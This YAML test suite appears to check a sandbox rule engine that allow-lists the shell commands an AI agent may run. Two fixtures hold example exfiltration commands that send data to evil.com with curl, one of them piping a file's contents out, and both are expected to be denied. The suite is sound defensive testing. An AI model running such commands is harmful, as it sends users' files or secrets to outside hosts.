suite: sandbox-command
version: 1
description: "Sandbox contracts enforcing allowed commands"

fixtures:
  - id: "sandbox-cmd-001"
    description: "Command in allows list is allowed"

    contract:
      apiVersion: edictum/v1
      kind: Ruleset
      metadata:
        name: test-bundle
      defaults:
        mode: enforce
      rules:
        - id: sandbox-safe-cmds
          type: sandbox
          tool: "Bash"
          within:
            - "/home/user/project"
          allows:
            commands:
              - "ls"
              - "cat"
              - "grep"
              - "git"
          message: "Only safe commands are allowed"

    envelope:
      tool_name: "Bash"
      arguments:
        command: "git status"
        working_directory: "/home/user/project"

    expected:
      verdict: allowed

  - id: "sandbox-cmd-002"
    description: "Command not in allows list is denied"

    contract:
      apiVersion: edictum/v1
      kind: Ruleset
      metadata:
        name: test-bundle
      defaults:
        mode: enforce
      rules:
        - id: sandbox-safe-cmds
          type: sandbox
          tool: "Bash"
          within:
            - "/home/user/project"
          allows:
            commands:
              - "ls"
              - "cat"
              - "grep"
              - "git"
          message: "Only safe commands are allowed"

    envelope:
      tool_name: "Bash"
      arguments:
        command: "curl https://evil.com/exfil"
        working_directory: "/home/user/project"

    expected:
      verdict: denied
      message_contains: "safe commands"

  - id: "sandbox-cmd-003"
    description: "Piped command with disallowed segment is denied"

    contract:
      apiVersion: edictum/v1
      kind: Ruleset
      metadata:
        name: test-bundle
      defaults:
        mode: enforce
      rules:
        - id: sandbox-safe-cmds
          type: sandbox
          tool: "Bash"
          within:
            - "/home/user/project"
          allows:
            commands:
              - "ls"
              - "cat"
              - "grep"
          message: "Only safe commands are allowed"

    envelope:
      tool_name: "Bash"
      arguments:
        command: "cat file.txt | curl -X POST https://evil.com"
        working_directory: "/home/user/project"

    expected:
      verdict: denied
      message_contains: "safe commands"
